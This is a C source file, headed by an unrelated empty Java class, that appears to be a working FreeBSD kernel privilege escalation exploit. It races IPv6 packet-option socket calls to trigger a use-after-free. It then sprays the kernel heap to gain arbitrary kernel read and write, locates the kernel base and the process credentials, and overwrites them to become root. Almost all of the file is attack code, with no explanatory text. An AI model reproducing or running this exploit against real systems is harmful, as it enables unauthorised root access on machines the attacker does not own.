public class Main {
    
}
#define ELF_MAGIC 0x464c457f

#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25

#define TCLASS_MASTER 0x13370000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42

#define NUM_SPRAY_RACE 0x20
#define NUM_SPRAY 0x100
#define NUM_KQUEUES 0x100

#ifdef FBSD12
#define ALLPROC_OFFSET 0x1df3c38
#else
#define ALLPROC_OFFSET 0xf01e40
#endif

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

#define PROC_LIST_OFFSET (offsetof(struct proc, p_list))
#define PROC_UCRED_OFFSET (offsetof(struct proc, p_ucred))
#define PROC_FD_OFFSET (offsetof(struct proc, p_fd))
#define PROC_PID_OFFSET (offsetof(struct proc, p_pid))

#ifdef FBSD12

#define FILEDESC_FILES_OFFSET (offsetof(struct filedesc, fd_files))
#define FILEDESCENTTBL_OFILES_OFFSET (offsetof(struct fdescenttbl, fdt_ofiles))
#define FILEDESCENTTBL_NFILES_OFFSET (offsetof(struct fdescenttbl, fdt_nfiles))
#define FILEDESCENT_FILE_OFFSET (offsetof(struct filedescent, fde_file))
#define FILE_TYPE_OFFSET (offsetof(struct file, f_type))
#define FILE_DATA_OFFSET (offsetof(struct file, f_data))

#else

#define FILEDESC_OFILES_OFFSET (offsetof(struct filedesc, fd_ofiles))
#define FILEDESC_NFILES_OFFSET (offsetof(struct filedesc, fd_nfiles))
#define FILE_TYPE_OFFSET (offsetof(struct file, f_type))
#define FILE_DATA_OFFSET (offsetof(struct file, f_data))

#endif

#define KNOTE_FOP_OFFSET (offsetof(struct knote, kn_fop))
#define FILTEROPS_DETACH_OFFSET (offsetof(struct filterops, f_detach))

#define SOCKET_PCB_OFFSET (offsetof(struct socket, so_pcb))
#define INPCB_OUTPUTOPTS_OFFSET (offsetof(struct inpcb, in6p_outputopts))

int kqueue(void);
int kevent(int kq, const struct kevent *changelist, int nchanges,
           struct kevent *eventlist, int nevents,
           const struct timespec *timeout);

static uint64_t kernel_base;
static uint64_t p_ucred, p_fd;
static uint64_t kevent_addr, pktopts_addr;

static int triggered = 0;
static int kevent_sock, master_sock, overlap_sock, victim_sock;
static int spray_sock[NUM_SPRAY];
static int kq[NUM_KQUEUES];

static void hexDump(const void *data, size_t size) {
  size_t i;
  for(i = 0; i < size; i++) {
    printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '\n');
  }
  printf("\n");
}

static int new_socket(void) {
  return socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

static void build_tclass_cmsg(char *buf, int val) {
  struct cmsghdr *cmsg;

  cmsg = (struct cmsghdr *)buf;
  cmsg->cmsg_len = CMSG_LEN(sizeof(int));
  cmsg->cmsg_level = IPPROTO_IPV6;
  cmsg->cmsg_type = IPV6_TCLASS;

  *(int *)CMSG_DATA(cmsg) = val;
}

static int build_rthdr_msg(char *buf, int size) {
  struct ip6_rthdr *rthdr;
  int len;

  len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;

  memset(buf, 0, size);

  rthdr = (struct ip6_rthdr *)buf;
  rthdr->ip6r_nxt = 0;
  rthdr->ip6r_len = len;
  rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
  rthdr->ip6r_segleft = rthdr->ip6r_len >> 1;

  return size;
}

static int get_rthdr(int s, char *buf, socklen_t len) {
  return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &len);
}

static int set_rthdr(int s, char *buf, socklen_t len) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

static int free_rthdr(int s) {
  return set_rthdr(s, NULL, 0);
}

static int get_tclass(int s) {
  int val;
  socklen_t len = sizeof(val);
  getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, &len);
  return val;
}

static int set_tclass(int s, int val) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val));
}

static int get_pktinfo(int s, char *buf) {
  socklen_t len = sizeof(struct in6_pktinfo);
  return getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &len);
}

static int set_pktinfo(int s, char *buf) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo));
}

static int set_pktopts(int s, char *buf, socklen_t len) {
  return setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len);
}

static int free_pktopts(int s) {
  return set_pktopts(s, NULL, 0);
}

static uint64_t leak_rthdr_ptr(int s) {
  char buf[0x100];
  get_rthdr(s, buf, sizeof(buf));
  return *(uint64_t *)(buf + PKTOPTS_RTHDR_OFFSET);
}

static uint64_t leak_kmalloc(char *buf, int size) {
  int rthdr_len = build_rthdr_msg(buf, size);
  set_rthdr(master_sock, buf, rthdr_len);
#ifdef FBSD12
  get_rthdr(master_sock, buf, rthdr_len);
  return *(uint64_t *)(buf + 0x00);
#else
  return leak_rthdr_ptr(overlap_sock);
#endif
}

static void write_to_victim(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  *(uint64_t *)(buf + 0x00) = addr;
  *(uint64_t *)(buf + 0x08) = 0;
  *(uint32_t *)(buf + 0x10) = 0;
  set_pktinfo(master_sock, buf);
}

static int find_victim_sock(void) {
  char buf[sizeof(struct in6_pktinfo)];

  write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);

  for (int i = 0; i < NUM_SPRAY; i++) {
    get_pktinfo(spray_sock[i], buf);
    if (*(uint64_t *)(buf + 0x00) != 0)
      return i;
  }

  return -1;
}

static uint8_t kread8(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  write_to_victim(addr);
  get_pktinfo(victim_sock, buf);
  return *(uint8_t *)buf;
}

static uint16_t kread16(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  write_to_victim(addr);
  get_pktinfo(victim_sock, buf);
  return *(uint16_t *)buf;
}

static uint32_t kread32(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  write_to_victim(addr);
  get_pktinfo(victim_sock, buf);
  return *(uint32_t *)buf;
}

static uint64_t kread64(uint64_t addr) {
  char buf[sizeof(struct in6_pktinfo)];
  write_to_victim(addr);
  get_pktinfo(victim_sock, buf);
  return *(uint64_t *)buf;
}

static void kread(void *dst, uint64_t src, size_t len) {
  for (int i = 0; i < len; i++)
    ((uint8_t *)dst)[i] = kread8(src + i);
}

static void kwrite64(uint64_t addr, uint64_t val) {
  int fd = open("/dev/kmem", O_RDWR);
  if (fd >= 0) {
    lseek(fd, addr, SEEK_SET);
    write(fd, &val, sizeof(val));
    close(fd);
  }
}

static int kwrite(uint64_t addr, void *buf) {
  write_to_victim(addr);
  return set_pktinfo(victim_sock, buf);
}

static uint64_t find_kernel_base(uint64_t addr) {
  addr &= ~(PAGE_SIZE - 1);
  while (kread32(addr) != ELF_MAGIC)
    addr -= PAGE_SIZE;
  return addr;
}

static int find_proc_cred_and_fd(pid_t pid) {
  uint64_t proc = kread64(kernel_base + ALLPROC_OFFSET);

  while (proc) {
    if (kread32(proc + PROC_PID_OFFSET) == pid) {
      p_ucred = kread64(proc + PROC_UCRED_OFFSET);
      p_fd = kread64(proc + PROC_FD_OFFSET);
      printf("[+] p_ucred: 0x%lx\n", p_ucred);
      printf("[+] p_fd: 0x%lx\n", p_fd);
      return 0;
    }

    proc = kread64(proc + PROC_LIST_OFFSET);
  }

  return -1;
}

#ifdef FBSD12

static uint64_t find_socket_data(int s) {
  uint64_t files, ofiles, fp;
  int nfiles;
  short type;

  files = kread64(p_fd + FILEDESC_FILES_OFFSET);
  if (!files)
    return 0;

  ofiles = files + FILEDESCENTTBL_OFILES_OFFSET;

  nfiles = kread32(files + FILEDESCENTTBL_NFILES_OFFSET);
  if (s < 0 || s >= nfiles)
    return 0;

  fp = kread64(ofiles + s * sizeof(struct filedescent) + FILEDESCENT_FILE_OFFSET);
  if (!fp)
    return 0;

  type = kread16(fp + FILE_TYPE_OFFSET);
  if (type != DTYPE_SOCKET)
    return 0;

  return kread64(fp + FILE_DATA_OFFSET);
}

#else

static uint64_t find_socket_data(int s) {
  uint64_t ofiles, fp;
  int nfiles;
  short type;

  ofiles = kread64(p_fd + FILEDESC_OFILES_OFFSET);
  if (!ofiles)
    return 0;

  nfiles = kread32(p_fd + FILEDESC_NFILES_OFFSET);
  if (s < 0 || s >= nfiles)
    return 0;

  fp = kread64(ofiles + s * sizeof(struct file *));
  if (!fp)
    return 0;

  type = kread16(fp + FILE_TYPE_OFFSET);
  if (type != DTYPE_SOCKET)
    return 0;

  return kread64(fp + FILE_DATA_OFFSET);
}

#endif

static uint64_t find_socket_pcb(int s) {
  uint64_t f_data;

  f_data = find_socket_data(s);
  if (!f_data)
    return 0;

  return kread64(f_data + SOCKET_PCB_OFFSET);
}

static uint64_t find_socket_pktopts(int s) {
  uint64_t in6p;

  in6p = find_socket_pcb(s);
  if (!in6p)
    return 0;

  return kread64(in6p + INPCB_OUTPUTOPTS_OFFSET);
}

static void cleanup(void) {
  uint64_t master_pktopts, overlap_pktopts, victim_pktopts;

  master_pktopts  = find_socket_pktopts(master_sock);
  overlap_pktopts = find_socket_pktopts(overlap_sock);
  victim_pktopts  = find_socket_pktopts(victim_sock);

  kwrite64(master_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);
  kwrite64(overlap_pktopts + PKTOPTS_RTHDR_OFFSET, 0);
  kwrite64(victim_pktopts  + PKTOPTS_PKTINFO_OFFSET, 0);
}

static void escalate_privileges(void) {
  char buf[sizeof(struct in6_pktinfo)];

  *(uint32_t *)(buf + 0x00) = 0; // cr_uid
  *(uint32_t *)(buf + 0x04) = 0; // cr_ruid
  *(uint32_t *)(buf + 0x08) = 0; // cr_svuid
  *(uint32_t *)(buf + 0x0c) = 1; // cr_ngroups
  *(uint32_t *)(buf + 0x10) = 0; // cr_rgid

  kwrite(p_ucred + 4, buf);
}

static int find_overlap_sock(void) {
  set_tclass(master_sock, TCLASS_TAINT);

  for (int i = 0; i < NUM_SPRAY; i++) {
    if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
      return i;
  }

  return -1;
}

static int spray_pktopts(void) {
  for (int i = 0; i < NUM_SPRAY_RACE; i++)
    set_tclass(spray_sock[i], TCLASS_SPRAY);

  if (get_tclass(master_sock) == TCLASS_SPRAY)
    return 1;

  for (int i = 0; i < NUM_SPRAY_RACE; i++)
    free_pktopts(spray_sock[i]);

  return 0;
}

static void *use_thread(void *arg) {
  char buf[CMSG_SPACE(sizeof(int))];
  build_tclass_cmsg(buf, 0);

  while (!triggered && get_tclass(master_sock) != TCLASS_SPRAY) {
    set_pktopts(master_sock, buf, sizeof(buf));

#ifdef FBSD12
     usleep(100);
#endif
  }

  triggered = 1;
  return NULL;
}

static void *free_thread(void *arg) {
  while (!triggered && get_tclass(master_sock) != TCLASS_SPRAY) {
    free_pktopts(master_sock);

#ifdef FBSD12
    if (spray_pktopts())
      break;
#endif

    usleep(100);
  }

  triggered = 1;
  return NULL;
}

static int trigger_uaf(void) {
  pthread_t th[2];

  pthread_create(&th[0], NULL, use_thread, NULL);
  pthread_create(&th[1], NULL, free_thread, NULL);

  while (1) {
    if (spray_pktopts())
      break;

#ifndef FBSD12
    usleep(100);
#endif
  }

  triggered = 1;

  pthread_join(th[0], NULL);
  pthread_join(th[1], NULL);

  return find_overlap_sock();
}

static int fake_pktopts(uint64_t pktinfo) {
  char buf[0x100];
  int rthdr_len, tclass;

  // Free master_sock's pktopts
  free_pktopts(overlap_sock);

  // Spray rthdr's to refill master_sock's pktopts
  rthdr_len = build_rthdr_msg(buf, 0x100);
  for (int i = 0; i < NUM_SPRAY; i++) {
    *(uint64_t *)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
    *(uint32_t *)(buf + PKTOPTS_TCLASS_OFFSET)  = TCLASS_MASTER | i;
    set_rthdr(spray_sock[i], buf, rthdr_len);
  }

  tclass = get_tclass(master_sock);

  // See if pktopts has been refilled correctly
  if ((tclass & 0xffff0000) != TCLASS_MASTER) {
    printf("[-] Error could not refill pktopts.\n");
    exit(1);
  }

  return tclass & 0xffff;
}

static void leak_kevent_pktopts(void) {
  char buf[0x800];

  struct kevent kv;
  EV_SET(&kv, kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);

  // Free pktopts
  for (int i = 0; i < NUM_SPRAY; i++)
    free_pktopts(spray_sock[i]);

  // Leak 0x800 kmalloc addr
  kevent_addr = leak_kmalloc(buf, 0x800);
  printf("[+] kevent_addr: 0x%lx\n", kevent_addr);

  // Free rthdr buffer and spray kevents to occupy this location
  free_rthdr(master_sock);
  for (int i = 0; i < NUM_KQUEUES; i++)
    kevent(kq[i], &kv, 1, 0, 0, 0);

  // Leak 0x100 kmalloc addr
  pktopts_addr = leak_kmalloc(buf, 0x100);
  printf("[+] pktopts_addr: 0x%lx\n", pktopts_addr);

  // Free rthdr buffer and spray pktopts to occupy this location
  free_rthdr(master_sock);
  for (int i = 0; i < NUM_SPRAY; i++)
    set_tclass(spray_sock[i], 0);
}

int main(int argc, char *argv[]) {
  uint64_t knote, kn_fop, f_detach;
  int idx;

  printf("[*] Initializing sockets...\n");

  kevent_sock = new_socket();
  master_sock = new_socket();

  for (int i = 0; i < NUM_SPRAY; i++)
    spray_sock[i] = new_socket();

  for (int i = 0; i < NUM_KQUEUES; i++)
    kq[i] = kqueue();

  printf("[*] Triggering UAF...\n");
  idx = trigger_uaf();
  if (idx == -1) {
    printf("[-] Error could not find overlap sock.\n");
    exit(1);
  }

  // master_sock and overlap_sock point to the same pktopts
  overlap_sock = spray_sock[idx];
  spray_sock[idx] = new_socket();
  printf("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

  // Reallocate pktopts
  for (int i = 0; i < NUM_SPRAY; i++) {
    free_pktopts(spray_sock[i]);
    set_tclass(spray_sock[i], 0);
  }

  // Fake master pktopts
  idx = fake_pktopts(0);
  overlap_sock = spray_sock[idx];
  spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier
  printf("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

  // Leak address of some kevent and pktopts
  leak_kevent_pktopts();

  // Fake master pktopts
  idx = fake_pktopts(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
  overlap_sock = spray_sock[idx];
  printf("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

  idx = find_victim_sock();
  if (idx == -1) {
    printf("[-] Error could not find victim sock.\n");
    exit(1);
  }

  victim_sock = spray_sock[idx];
  printf("[+] Victim socket: %x (%x)\n", victim_sock, idx);

  printf("[+] Arbitrary R/W achieved.\n");

  knote    = kread64(kevent_addr + kevent_sock * sizeof(uintptr_t));
  kn_fop   = kread64(knote + KNOTE_FOP_OFFSET);
  f_detach = kread64(kn_fop + FILTEROPS_DETACH_OFFSET);

  printf("[+] knote: 0x%lx\n", knote);
  printf("[+] kn_fop: 0x%lx\n", kn_fop);
  printf("[+] f_detach: 0x%lx\n", f_detach);

  printf("[+] Finding kernel base...\n");
  kernel_base = find_kernel_base(f_detach);
  printf("[+] Kernel base: 0x%lx\n", kernel_base);

  printf("[+] Finding process cred and fd...\n");
  find_proc_cred_and_fd(getpid());

  printf("[*] Escalating privileges...\n");
  escalate_privileges();

  printf("[*] Cleaning up...\n");
  cleanup();

  printf("[+] Done.\n");

  return 0;
}